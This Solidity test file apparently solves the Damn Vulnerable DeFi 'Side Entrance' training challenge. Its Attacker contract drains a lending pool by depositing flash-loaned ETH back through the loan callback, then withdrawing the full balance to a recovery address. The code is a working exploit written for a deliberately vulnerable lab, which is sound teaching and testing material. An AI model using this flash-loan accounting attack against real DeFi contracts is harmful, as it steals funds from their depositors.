// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {StdUtils} from "forge-std/StdUtils.sol";
import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    InvariantTester invariantTester;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();

        invariantTester = new InvariantTester(pool);
        vm.deal(address(invariantTester), ETHER_IN_POOL * 100);
        targetContract(address(invariantTester));
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        pool.flashLoan(ETHER_IN_POOL);
    }
    
    /**
    * USED FOR TESTING INITIAL STATE - DO NOT TOUCH
    */
    function execute() external payable {
        payable(pool).transfer(msg.value);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        (new Attacker()).attack(pool, recovery, ETHER_IN_POOL);
    }

    function invariant_etherStillInPool() public view {
        // Invariant to ensure that the pool still has the initial amount of ETH
        assertEq(address(pool).balance + address(invariantTester).balance, ETHER_IN_POOL * 101, "total balances changed");
    }


    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}

contract Attacker {
    function attack(SideEntranceLenderPool _pool, address _recovery, uint256 _amount) external {
        // Attacker can deploy the contract and call the execute function
        // to deposit the flash loaned ETH into the pool.
        _pool.flashLoan( _amount);
        _pool.withdraw();
        payable(_recovery).transfer(_amount);
    }

    function execute() external payable {
        // This function is called by the pool during the flash loan.
        // It deposits the flash loaned ETH into the pool.
        SideEntranceLenderPool(payable(msg.sender)).deposit{value: msg.value}();
    }

    receive() external payable {
    }
}

contract InvariantTester is StdUtils {
    SideEntranceLenderPool pool;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function deposit(uint256 amount) external payable {
        bound(amount, 0, address(this).balance);
        pool.deposit{value: amount}();
    }
    function withdraw() external {
        pool.withdraw();
    }
    function flashLoan(uint256 amount) external {
        pool.flashLoan(amount);
    }
    function execute() external payable {
        // This function is called by the pool during the flash loan.
        // It deposits the flash loaned ETH into the pool.
        if (msg.sender != address(pool)) {
            revert("Only pool can call execute");
        }
        payable(msg.sender).transfer(msg.value);
    }

}